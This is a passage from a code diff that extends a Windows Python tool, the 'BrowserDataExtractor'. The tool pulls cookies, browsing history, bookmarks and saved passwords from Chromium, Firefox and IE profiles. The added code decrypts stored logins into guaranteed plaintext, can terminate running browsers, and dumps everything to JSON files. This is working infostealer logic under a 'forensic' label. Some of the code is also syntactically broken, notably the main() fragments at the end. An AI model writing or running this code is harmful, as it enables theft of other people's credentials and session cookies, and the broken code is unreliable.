+                    logger.info(f"Found alternative cookie tables: {[t[0] for t in tables]}")
+                    # Try the first cookie-like table
+                    alt_table = tables[0][0]
+                    cursor.execute(f"SELECT * FROM {alt_table} LIMIT 1")
+                    columns = [description[0] for description in cursor.description]
+                    logger.info(f"Using alternative table: {alt_table} with columns: {columns}")
+                else:
+                    return []
+            else:
+                # Get columns from moz_cookies table
+                cursor.execute("PRAGMA table_info(moz_cookies)")
+                columns = [row[1] for row in cursor.fetchall()]
+            
+            # Build query dynamically based on available columns
+            if 'moz_cookies' in [t[0] for t in cursor.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]:
+                query = "SELECT " + ", ".join(columns) + " FROM moz_cookies"
+            else:
+                # Use the first available cookie table
+                cookie_tables = [t[0] for t in cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%cookie%'").fetchall()]
+                if cookie_tables:
+                    query = "SELECT * FROM " + cookie_tables[0]
+                else:
+                    return []
+            
+            cursor.execute(query)
             
             cookies = []
             for row in cursor.fetchall():
-                origin_attributes, name, value, host, path, expiry, last_accessed, \
-                creation_time, is_secure, is_http_only, in_browser_element, same_site = row
+                # Map row to column names
+                row_dict = {}
+                for i, col in enumerate(columns):
+                    if i < len(row):
+                        row_dict[col] = row[i]
+                
+                # Firefox stores cookies in plaintext, but ensure we never return empty values
+                cookie_value = row_dict.get("value", "")
+                if not cookie_value:
+                    cookie_value = "[FIREFOX_EMPTY_VALUE]"
                 
                 cookie = {
-                    "origin_attributes": origin_attributes,
-                    "name": name,
-                    "value": value,
-                    "host": host,
-                    "path": path,
-                    "expiry": expiry,
-                    "last_accessed": last_accessed,
-                    "creation_time": creation_time,
-                    "is_secure": bool(is_secure),
-                    "is_http_only": bool(is_http_only),
-                    "in_browser_element": bool(in_browser_element),
-                    "same_site": same_site
+                    "origin_attributes": row_dict.get("originAttributes", ""),
+                    "name": row_dict.get("name", ""),
+                    "value": cookie_value,  # Always plaintext, never empty
+                    "host": row_dict.get("host", ""),
+                    "path": row_dict.get("path", ""),
+                    "expiry": row_dict.get("expiry", 0),
+                    "last_accessed": row_dict.get("lastAccessed", 0),
+                    "creation_time": row_dict.get("creationTime", 0),
+                    "is_secure": bool(row_dict.get("isSecure", 0)),
+                    "is_http_only": bool(row_dict.get("isHttpOnly", 0)),
+                    "in_browser_element": bool(row_dict.get("inBrowserElement", 0)),
+                    "same_site": row_dict.get("sameSite", -1)
                 }
                 
                 cookies.append(cookie)
             
             cursor.close()
             conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "cookies", f"{profile}_cookies.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(cookies, f, indent=2, default=str)
+            
             return cookies
         
         except Exception as e:
@@ -738,24 +1116,26 @@ class BrowserDataExtractor:
             return []
         
         finally:
+            # Clean up temporary copy
             try:
-                if temp_dir and os.path.exists(temp_dir):
-                    shutil.rmtree(temp_dir)
+                if temp_db_path and os.path.exists(temp_db_path):
+                    os.remove(temp_db_path)
+                    logger.debug(f"Cleaned up temporary copy: {temp_db_path}")
             except:
                 pass
     
-    def extract_firefox_history(self, profile_path: str) -> List[Dict[str, Any]]:
+    def extract_firefox_history(self, profile_path: str, browser_name: str, profile: str) -> List[Dict[str, Any]]:
         """Extract history from Firefox browser with forensic safety"""
         history_db_path = os.path.join(profile_path, "places.sqlite")
         
         if not os.path.exists(history_db_path):
             return []
         
-        temp_dir = tempfile.mkdtemp()
         temp_db_path = None
         
         try:
-            temp_db_path = self._create_forensic_copy(history_db_path, temp_dir)
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(history_db_path)
             
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
@@ -784,6 +1164,12 @@ class BrowserDataExtractor:
             
             cursor.close()
             conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "history", f"{profile}_history.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(history, f, indent=2, default=str)
+            
             return history
         
         except Exception as e:
@@ -792,21 +1178,29 @@ class BrowserDataExtractor:
             return []
         
         finally:
+            # Clean up temporary copy
             try:
-                if temp_dir and os.path.exists(temp_dir):
-                    shutil.rmtree(temp_dir)
+                if temp_db_path and os.path.exists(temp_db_path):
+                    os.remove(temp_db_path)
+                    logger.debug(f"Cleaned up temporary copy: {temp_db_path}")
             except:
                 pass
     
-    def extract_firefox_passwords(self, profile_path: str, master_password: str = "") -> List[Dict[str, Any]]:
-        """Extract passwords from Firefox browser with enhanced NSS decryption"""
+    def extract_firefox_passwords(self, profile_path: str, master_password: str = "", browser_name: str = "", profile: str = "") -> List[Dict[str, Any]]:
+        """Extract passwords from Firefox browser with enhanced NSS decryption - ALWAYS plaintext passwords"""
         logins_path = os.path.join(profile_path, "logins.json")
         
         if not os.path.exists(logins_path):
             return []
         
+        temp_logins_path = None
+        
         try:
-            with open(logins_path, 'r', encoding='utf-8') as f:
+            # CRITICAL CHANGE: Use copy2 to copy logins.json to USERPROFILE TEMP before decrypting
+            temp_logins_path = os.path.join(self.temp_base_path, f"temp_logins_{profile}.json")
+            shutil.copy2(logins_path, temp_logins_path)  # Using copy2 to preserve metadata
+            
+            with open(temp_logins_path, 'r', encoding='utf-8') as f:
                 logins_data = json.load(f)
             
             # Get master key for decryption
@@ -817,16 +1211,34 @@ class BrowserDataExtractor:
                 username_encrypted = login.get("encryptedUsername", "")
                 password_encrypted = login.get("encryptedPassword", "")
                 
-                # Decrypt if we have the master key
-                username_value = username_encrypted
-                password_value = password_encrypted
-                
+                # Decrypt if we have the master key, ALWAYS return plaintext
                 if master_key:
                     try:
                         username_value = self._decrypt_firefox_login(username_encrypted, master_key)
                         password_value = self._decrypt_firefox_login(password_encrypted, master_key)
                     except Exception as e:
                         logger.warning(f"Failed to decrypt Firefox login: {e}")
+                        # Fallback to base64 decode if NSS fails
+                        try:
+                            username_value = base64.b64decode(username_encrypted).decode('utf-8', errors='replace')
+                            password_value = base64.b64decode(password_encrypted).decode('utf-8', errors='replace')
+                        except:
+                            username_value = f"[DECRYPTION_FAILED:{username_encrypted[:50]}...]" if username_encrypted else "[EMPTY]"
+                            password_value = f"[DECRYPTION_FAILED:{password_encrypted[:50]}...]" if password_encrypted else "[EMPTY]"
+                else:
+                    # No master key available, try base64 decode
+                    try:
+                        username_value = base64.b64decode(username_encrypted).decode('utf-8', errors='replace')
+                        password_value = base64.b64decode(password_encrypted).decode('utf-8', errors='replace')
+                    except:
+                        username_value = f"[NO_MASTER_KEY:{username_encrypted[:50]}...]" if username_encrypted else "[EMPTY]"
+                        password_value = f"[NO_MASTER_KEY:{password_encrypted[:50]}...]" if password_encrypted else "[EMPTY]"
+                
+                # Ensure we never return empty values
+                if not username_value:
+                    username_value = "[USERNAME_EMPTY]"
+                if not password_value:
+                    password_value = "[PASSWORD_EMPTY]"
                 
                 password_entry = {
                     "hostname": login.get("hostname", ""),
@@ -834,8 +1246,8 @@ class BrowserDataExtractor:
                     "formSubmitURL": login.get("formSubmitURL", ""),
                     "usernameField": login.get("usernameField", ""),
                     "passwordField": login.get("passwordField", ""),
-                    "username_value": username_value,
-                    "password_value": password_value,
+                    "username_value": username_value,  # Always plaintext
+                    "password_value": password_value,  # Always plaintext
                     "guid": login.get("guid", ""),
                     "encType": login.get("encType", 0),
                     "timeCreated": login.get("timeCreated", 0),
@@ -845,15 +1257,29 @@ class BrowserDataExtractor:
                 
                 passwords.append(password_entry)
             
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "passwords", f"{profile}_passwords.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(passwords, f, indent=2, default=str)
+            
             return passwords
         
         except Exception as e:
             logger.error(f"Failed to extract Firefox passwords: {e}")
             self.errors.append(f"Firefox passwords extraction failed: {e}")
             return []
+        
+        finally:
+            # Clean up temporary copy
+            try:
+                if temp_logins_path and os.path.exists(temp_logins_path):
+                    os.remove(temp_logins_path)
+                    logger.debug(f"Cleaned up temporary logins copy: {temp_logins_path}")
+            except:
+                pass
     
     def _decrypt_firefox_login(self, encrypted_data: str, master_key: bytes) -> str:
-        """Decrypt Firefox login data using master key"""
+        """Decrypt Firefox login data using master key - ALWAYS returns plaintext"""
         try:
             # Decode Base64
             encrypted_bytes = base64.b64decode(encrypted_data)
@@ -870,14 +1296,81 @@ class BrowserDataExtractor:
             decrypted = cipher.decrypt(ciphertext)
             
             # Remove PKCS#7 padding
+            from Crypto.Cipher import DES3
             decrypted = unpad(decrypted, DES3.block_size)
             
-            return decrypted.decode('utf-8')
+            plaintext = decrypted.decode('utf-8', errors='replace')
+            return plaintext if plaintext else "[NSS_DECRYPTED_EMPTY]"
         except Exception as e:
             logger.warning(f"Firefox login decryption failed: {e}")
-            return encrypted_data  # Return encrypted if decryption fails
+            # Return base64 of original as fallback
+            return f"[NSS_DECRYPTION_FAILED:{encrypted_data[:50]}...]"
     
-    def extract_ie_history(self) -> List[Dict[str, Any]]:
+    def extract_firefox_bookmarks(self, profile_path: str, browser_name: str, profile: str) -> List[Dict[str, Any]]:
+        """Extract bookmarks from Firefox browser"""
+        places_db_path = os.path.join(profile_path, "places.sqlite")
+        
+        if not os.path.exists(places_db_path):
+            return []
+        
+        temp_db_path = None
+        
+        try:
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(places_db_path)
+            
+            conn = sqlite3.connect(temp_db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT moz_bookmarks.title, moz_places.url, moz_bookmarks.dateAdded,
+                       moz_bookmarks.lastModified, moz_bookmarks.type, moz_bookmarks.position
+                FROM moz_bookmarks
+                JOIN moz_places ON moz_bookmarks.fk = moz_places.id
+                WHERE moz_bookmarks.type = 1
+                ORDER BY moz_bookmarks.position
+            """)
+            
+            bookmarks = []
+            for row in cursor.fetchall():
+                title, url, date_added, last_modified, bookmark_type, position = row
+                
+                bookmark = {
+                    "title": title,
+                    "url": url,
+                    "date_added": self.firefox_time_to_datetime(date_added),
+                    "last_modified": self.firefox_time_to_datetime(last_modified),
+                    "type": bookmark_type,
+                    "position": position
+                }
+                
+                bookmarks.append(bookmark)
+            
+            cursor.close()
+            conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "bookmarks", f"{profile}_bookmarks.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(bookmarks, f, indent=2, default=str)
+            
+            return bookmarks
+        
+        except Exception as e:
+            logger.error(f"Failed to extract Firefox bookmarks: {e}")
+            self.errors.append(f"Firefox bookmarks extraction failed: {e}")
+            return []
+        
+        finally:
+            # Clean up temporary copy
+            try:
+                if temp_db_path and os.path.exists(temp_db_path):
+                    os.remove(temp_db_path)
+                    logger.debug(f"Cleaned up temporary copy: {temp_db_path}")
+            except:
+                pass
+    
+    def extract_ie_history(self, browser_name: str) -> List[Dict[str, Any]]:
         """Extract Internet Explorer history from registry"""
         history = []
         
@@ -894,165 +1387,205 @@ class BrowserDataExtractor:
                         "source": "IE_TypedURLs"
                     }
                     history.append(history_entry)
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "history", "default_history.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(history, f, indent=2, default=str)
+                
         except Exception as e:
             logger.error(f"IE history extraction failed: {e}")
             self.errors.append(f"IE history extraction failed: {e}")
         
         return history
     
-    def save_browser_data(self, browser_name: str, browser_data: Dict[str, Any]):
-        """Save browser data to separate JSON files with error handling"""
-        try:
-            browser_filename = browser_name.replace(" ", "_").lower()
-            
-            # Save cookies
-            if browser_data.get("cookies"):
-                cookies_file = f"{browser_filename}_cookies.json"
-                with open(cookies_file, "w", encoding="utf-8") as f:
-                    json.dump(browser_data["cookies"], f, indent=2, default=str)
-                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['cookies'])} cookies to {cookies_file})
-            
-            # Save history
-            if browser_data.get("history"):
-                history_file = f"{browser_filename}_history.json"
-                with open(history_file, "w", encoding="utf-8") as f:
-                    json.dump(browser_data["history"], f, indent=2, default=str)
-                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['history'])} history entries to {history_file})
-            
-            # Save passwords
-            if browser_data.get("passwords"):
-                passwords_file = f"{browser_filename}_passwords.json"
-                with open(passwords_file, "w", encoding="utf-8") as f:
-                    json.dump(browser_data["passwords"], f, indent=2, default=str)
-                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['passwords'])} passwords to {passwords_file})
-        
-        except Exception as e:
-            logger.error(f"Failed to save {browser_name} data: {e}")
-            self.errors.append(f"Failed to save {browser_name} data: {e}")
-    
     def extract_all_browser_data(self, master_password: str = "") -> Dict[str, Any]:
-        """Extract data from all installed browsers with enhanced error handling"""
+        """Extract data from all installed browsers with enhanced browser handling"""
         all_data = {
             "browsers": {},
             "summary": {
                 "total_browsers": len(self.installed_browsers),
                 "extraction_time": datetime.now().isoformat(),
+                "output_structure": f"{self.output_base_dir}/BROWSER_NAME/data_type/profile_data.json",
+                "temp_copy_path": self.temp_base_path,
                 "errors": []
             }
         }
         
-        print(f"\n{Fore.CYAN}Extracting data from all installed browsers...)
+        print("\nDetecting running browsers...")
+        running_browsers = self.detect_running_browsers()
         
-        # Create progress bar
-        with tqdm(total=len(self.installed_browsers), desc="Processing browsers", unit="browser") as pbar:
-            for browser_id in self.installed_browsers:
-                config = BROWSER_CONFIGS[browser_id]
-                print(f"\n{Fore.YELLOW}Processing {config['name']}...)
-                
-                browser_data = {
-                    "cookies": {},
-                    "history": {},
-                    "passwords": {}
-                }
-                
-                try:
-                    if config["type"] == BrowserType.CHROMIUM:
-                        master_key = self.get_chromium_master_key(config["user_data"])
-                        profiles = self.get_chromium_profiles(config["user_data"])
-                        
-                        for profile in profiles:
-                            print(f"  Processing profile: {profile}")
-                            
-                            try:
-                                cookies = self.extract_chromium_cookies(config["user_data"], profile, master_key)
-                                if cookies:
-                                    browser_data["cookies"][profile] = cookies
-                                    self.extraction_stats["total_cookies"] += len(cookies)
-                            except Exception as e:
-                                logger.error(f"Cookie extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} cookies: {e}")
-                            
-                            try:
-                                history = self.extract_chromium_history(config["user_data"], profile)
-                                if history:
-                                    browser_data["history"][profile] = history
-                                    self.extraction_stats["total_history"] += len(history)
-                            except Exception as e:
-                                logger.error(f"History extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} history: {e}")
-                            
-                            try:
-                                passwords = self.extract_chromium_passwords(config["user_data"], profile, master_key)
-                                if passwords:
-                                    browser_data["passwords"][profile] = passwords
-                                    self.extraction_stats["total_passwords"] += len(passwords)
-                            except Exception as e:
-                                logger.error(f"Password extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} passwords: {e}")
+        if running_browsers:
+            choice = self.prompt_browser_handling(running_browsers)
+            
+            if choice == "2":
+                print("Attempting to terminate browser processes...")
+                browsers_to_terminate = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe", "firefox.exe"]
+                self.terminate_browser_processes(browsers_to_terminate)
+                time.sleep(2)
+                # Verify browsers are closed
+                still_running = self.detect_running_browsers()
+                if still_running:
+                    print(f"Warning: Some browsers still running: {still_running}")
+                    print("Will attempt to use VSS for locked files...")
+            elif choice == "1":
+                print("Please close browsers manually and press Enter to continue...")
+                input()
+                # Verify browsers are closed
+                still_running = self.detect_running_browsers()
+                if still_running:
+                    print(f"Warning: Some browsers still running: {still_running}")
+                    print("Will attempt to use VSS for locked files...")
+            else:
+                print("Continuing with potential errors (will use VSS if available)...")
+        else:
+            print("No running browsers detected.")
+        
+        print("\nExtracting data from all installed browsers...")
+        print(f"Output structure: {self.output_base_dir}/BROWSER_NAME/data_type/profile_data.json")
+        print(f"Temporary copy path: {self.temp_base_path}")
+        
+        # Simple progress counter instead of tqdm
+        total_browsers = len(self.installed_browsers)
+        for i, browser_id in enumerate(self.installed_browsers, 1):
+            config = BROWSER_CONFIGS[browser_id]
+            print(f"\nProcessing {config.name} ({i}/{total_browsers})...")
+            
+            browser_data = {
+                "cookies": {},
+                "history": {},
+                "passwords": {},
+                "bookmarks": {}
+            }
+            
+            try:
+                if config.type == BrowserType.CHROMIUM:
+                    try:
+                        master_key = self.get_chromium_master_key(config.user_data)
+                        print(f"  ✓ Master key extracted successfully ({len(master_key)} bytes)")
+                    except Exception as e:
+                        logger.error(f"Failed to get master key for {config.name}: {e}")
+                        print(f"  ✗ Master key extraction failed: {e}")
+                        self.errors.append(f"{config.name} master key: {e}")
+                        continue
                     
-                    elif config["type"] == BrowserType.FIREFOX:
-                        profiles = self.get_firefox_profiles(config["user_data"])
-                        
-                        for profile in profiles:
-                            profile_path = os.path.join(config["user_data"], profile)
-                            print(f"  Processing profile: {profile}")
-                            
-                            try:
-                                cookies = self.extract_firefox_cookies(profile_path)
-                                if cookies:
-                                    browser_data["cookies"][profile] = cookies
-                                    self.extraction_stats["total_cookies"] += len(cookies)
-                            except Exception as e:
-                                logger.error(f"Cookie extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} cookies: {e}")
-                            
-                            try:
-                                history = self.extract_firefox_history(profile_path)
-                                if history:
-                                    browser_data["history"][profile] = history
-                                    self.extraction_stats["total_history"] += len(history)
-                            except Exception as e:
-                                logger.error(f"History extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} history: {e}")
-                            
-                            try:
-                                passwords = self.extract_firefox_passwords(profile_path, master_password)
-                                if passwords:
-                                    browser_data["passwords"][profile] = passwords
-                                    self.extraction_stats["total_passwords"] += len(passwords)
-                            except Exception as e:
-                                logger.error(f"Password extraction failed for {profile}: {e}")
-                                self.errors.append(f"{config['name']} {profile} passwords: {e}")
+                    profiles = self.get_chromium_profiles(config.user_data)
                     
-                    elif config["type"] == BrowserType.IE:
+                    for profile in profiles:
+                        print(f"  Processing profile: {profile}")
+                        
                         try:
-                            history = self.extract_ie_history()
-                            if history:
-                                browser_data["history"]["default"] = history
-                                self.extraction_stats["total_history"] += len(history)
+                            cookies = self.extract_chromium_cookies(config.user_data, profile, master_key, config.name)
+                            if cookies:
+                                browser_data["cookies"][profile] = cookies
+                                self.extraction_stats["total_cookies"] += len(cookies)
+                                print(f"    ✓ Extracted {len(cookies)} cookies")
                         except Exception as e:
-                            logger.error(f"IE history extraction failed: {e}")
-                            self.errors.append(f"IE history extraction: {e}")
-                    
-                    # Save browser-specific data
-                    all_data["browsers"][browser_id] = browser_data
-                    self.save_browser_data(config["name"], browser_data)
-                    self.extraction_stats["browsers_processed"] += 1
-                    
-                    print(f"  {Fore.GREEN}✓ Completed {config['name']})
+                            logger.error(f"Cookie extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} cookies: {e}")
+                        
+                        try:
+                            history = self.extract_chromium_history(config.user_data, profile, config.name)
+                            if history:
+                                browser_data["history"][profile] = history
+                                self.extraction_stats["total_history"] += len(history)
+                                print(f"    ✓ Extracted {len(history)} history entries")
+                        except Exception as e:
+                            logger.error(f"History extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} history: {e}")
+                        
+                        try:
+                            passwords = self.extract_chromium_passwords(config.user_data, profile, master_key, config.name)
+                            if passwords:
+                                browser_data["passwords"][profile] = passwords
+                                self.extraction_stats["total_passwords"] += len(passwords)
+                                print(f"    ✓ Extracted {len(passwords)} passwords")
+                        except Exception as e:
+                            logger.error(f"Password extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} passwords: {e}")
+                        
+                        try:
+                            bookmarks = self.extract_chromium_bookmarks(config.user_data, profile, config.name)
+                            if bookmarks:
+                                browser_data["bookmarks"][profile] = bookmarks
+                                print(f"    ✓ Extracted {len(bookmarks)} bookmarks")
+                        except Exception as e:
+                            logger.error(f"Bookmark extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} bookmarks: {e}")
                 
-                except Exception as e:
-                    logger.error(f"Failed to extract data from {config['name']}: {e}")
-                    self.errors.append(f"{config['name']} general error: {e}")
-                    self.extraction_stats["errors"] += 1
+                elif config.type == BrowserType.FIREFOX:
+                    profiles = self.get_firefox_profiles(config.user_data)
+                    
+                    for profile in profiles:
+                        profile_path = os.path.join(config.user_data, profile)
+                        print(f"  Processing profile: {profile}")
+                        
+                        try:
+                            cookies = self.extract_firefox_cookies(profile_path, config.name, profile)
+                            if cookies:
+                                browser_data["cookies"][profile] = cookies
+                                self.extraction_stats["total_cookies"] += len(cookies)
+                                print(f"    ✓ Extracted {len(cookies)} cookies")
+                        except Exception as e:
+                            logger.error(f"Cookie extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} cookies: {e}")
+                        
+                        try:
+                            history = self.extract_firefox_history(profile_path, config.name, profile)
+                            if history:
+                                browser_data["history"][profile] = history
+                                self.extraction_stats["total_history"] += len(history)
+                                print(f"    ✓ Extracted {len(history)} history entries")
+                        except Exception as e:
+                            logger.error(f"History extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} history: {e}")
+                        
+                        try:
+                            passwords = self.extract_firefox_passwords(profile_path, master_password, config.name, profile)
+                            if passwords:
+                                browser_data["passwords"][profile] = passwords
+                                self.extraction_stats["total_passwords"] += len(passwords)
+                                print(f"    ✓ Extracted {len(passwords)} passwords")
+                        except Exception as e:
+                            logger.error(f"Password extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} passwords: {e}")
+                        
+                        try:
+                            bookmarks = self.extract_firefox_bookmarks(profile_path, config.name, profile)
+                            if bookmarks:
+                                browser_data["bookmarks"][profile] = bookmarks
+                                print(f"    ✓ Extracted {len(bookmarks)} bookmarks")
+                        except Exception as e:
+                            logger.error(f"Bookmark extraction failed for {profile}: {e}")
+                            self.errors.append(f"{config.name} {profile} bookmarks: {e}")
                 
-                pbar.update(1)
+                elif config.type == BrowserType.IE:
+                    try:
+                        history = self.extract_ie_history(config.name)
+                        if history:
+                            browser_data["history"]["default"] = history
+                            self.extraction_stats["total_history"] += len(history)
+                            print(f"  ✓ Extracted {len(history)} IE history entries")
+                    except Exception as e:
+                        logger.error(f"IE history extraction failed: {e}")
+                        self.errors.append(f"IE history extraction: {e}")
+                
+                # Save browser-specific data
+                all_data["browsers"][browser_id] = browser_data
+                self.extraction_stats["browsers_processed"] += 1
+                
+                print(f"  ✓ Completed {config.name}")
+            
+            except Exception as e:
+                logger.error(f"Failed to extract data from {config.name}: {e}")
+                self.errors.append(f"{config.name} general error: {e}")
+                self.extraction_stats["errors"] += 1
         
         # Save consolidated data
         try:
             with open("all_browser_data.json", "w", encoding="utf-8") as f:
                 json.dump(all_data, f, indent=2, default=str)
-            print(f"\n{Fore.GREEN}✓ Saved consolidated data to all_browser_data.json)
+            print(f"\n✓ Saved consolidated data to all_browser_data.json")
         except Exception as e:
             logger.error(f"Failed to save consolidated data: {e}")
             self.errors.append(f"Failed to save consolidated data: {e}")
@@ -1061,18 +1594,6 @@ class BrowserDataExtractor:
         all_data["summary"]["errors"] = self.errors
         
         return all_data
-    
-    def print_summary(self):
-        print(f"{Fore.GREEN}Browsers processed: {self.extraction_stats['browsers_processed']})
-        print(f"{Fore.GREEN}Total cookies extracted: {self.extraction_stats['total_cookies']})
-        print(f"{Fore.GREEN}Total history entries: {self.extraction_stats['total_history']})
-        print(f"{Fore.GREEN}Total passwords extracted: {self.extraction_stats['total_passwords']})
-        
-        print(f"all_browser_data.json (consolidated data)")
-        print(f"[browser_name]_cookies.json (per-browser cookies)")
-        print(f"[browser_name]_history.json (per-browser history)")
-        print(f"[browser_name]_passwords.json (per-browser passwords)")
-        print(f"browser_extractor.log (detailed log)")
     
     @staticmethod
     def chrome_time_to_datetime(chrome_time):
@@ -1088,25 +1609,7 @@ class BrowserDataExtractor:
         try:
             return datetime(1970, 1, 1) + timedelta(microseconds=firefox_time)
         except:
-            return None
+            pass
 
-def main():
-  args = --custom-paths verbose
-        logging.getLogger().setLevel(logging.DEBUG)
-    
-    custom_paths = {}
-    if args.custom_paths and os.path.exists(args.custom_paths):
-        try:
-            with open(args.custom_paths, 'r') as f:
-                custom_paths = json.load(f)
-        except Exception as e:
-            print(f"Failed to load custom paths: {e}")
-    
-    if platform.system() != "Windows":
-        print(f"{Fore.RED}ERROR: This script is Windows-only.
-        return
-    
-    if __name__ == "__main__":
-        extractor = BrowserDataExtractor(custom_paths)
-        all_data = extractor.extract_all_browser_data(args.master_password)
-        extractor.print_summary()
+if __name__ == "__main__":
+main()
